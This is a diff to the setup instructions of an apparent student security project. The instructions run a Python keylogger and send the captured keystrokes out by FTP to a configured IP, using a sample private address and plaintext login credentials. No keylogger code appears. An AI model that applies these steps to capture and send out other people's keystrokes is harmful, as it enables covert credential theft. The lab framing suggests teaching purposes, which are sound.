@@ -42,23 +42,20 @@ SETUP INSTRUCTIONS
 - git clone https://github.com/StephanoValdivia/IT359_GroupProject_Fall2025.git
 - cd IT359_GroupProject_Fall2025/src
 
-5 Create an empty text file that will serve as the log file
-- touch keylogs.txt
-
-6 Configure the IP address and the user for the FTP exfiltration
+5 Configure the IP address and the user for the FTP exfiltration
 - sudo nano keylogger.py
 - Look for the exfiltrate_file function
 - Replace the IP address with your own Ubuntu IP address on this line of code: ftp = FTP("10.0.0.58")
 - Replace the username and password with your own credentials on this line of code: ftp.login("vmuser", "ab12cd34")
 
-7 Start the keylogger script
+6 Start the keylogger script
 - sudo python3 keylogger.py
 
-8 Open a new terminal, browser window, etc. and start typing
+7 Open a new terminal, browser window, etc. and start typing
 
-9 Press the esc key to stop the keylogger
+8 Press the esc key to stop the keylogger
 
-10 Navigate to the home directory on Ubuntu and view the contents of the log file
+9 Navigate to the home directory on Ubuntu and view the contents of the log file
 - cd ~
 - cat keylogs.txt
 
